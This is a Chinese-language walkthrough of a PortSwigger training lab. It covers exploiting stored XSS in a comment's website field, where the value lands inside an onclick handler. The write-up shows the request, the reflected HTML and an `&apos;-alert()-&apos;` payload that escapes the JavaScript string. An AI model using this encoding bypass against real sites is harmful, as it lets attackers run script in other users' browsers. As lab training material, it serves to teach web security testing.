# 实验：尖括号和双引号经过 HTML 编码且单引号与反斜杠被转义的 `onclick` 事件中的存储型 XSS

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

本实验在评论功能中包含一个存储型跨站脚本漏洞。

为了解决本实验，请提交一条评论，使得当点击评论作者姓名时调用 `alert` 函数。

## 步骤

侦察
- 使用提交评论功能
    ```http
    POST /post/comment HTTP/2

    csrf=WPqKkdXzIrz0Z7qXCUXsyMx9v9PZ6iri&postId=7&comment=aaaaaaa&name=cccccccc&email=a%40bbbbbbbb&website=http:dddddddddd
    ```

    - 服务器返回
        ```html
        <section class="comment">
            <p>
                <img src="/resources/images/avatarDefault.svg" class="avatar"> 
                <a id="author" href="http:dddddddddd" onclick="var tracker={track(){}};tracker.track('http:dddddddddd');">cccccccc</a> | 16 July 2026
            </p>
            <p>aaaaaaa</p>
            <p></p>
        </section>
        ```
        - 源，评论字段 `website` 
        - 上下文 
            - `href` 属性值
            - `onclick` 属性值

探测
- 单引号被转义

攻击
- 评论字段 `website` 中构造 HTML 转义的单引号逃逸出 JS 字符串后运算
    `&apos;-alert()-&apos;`

    - 服务器返回
        `onclick="var tracker={track(){}};tracker.track('http:dddddddddd&apos;-alert(document.domain)-&apos;');"`
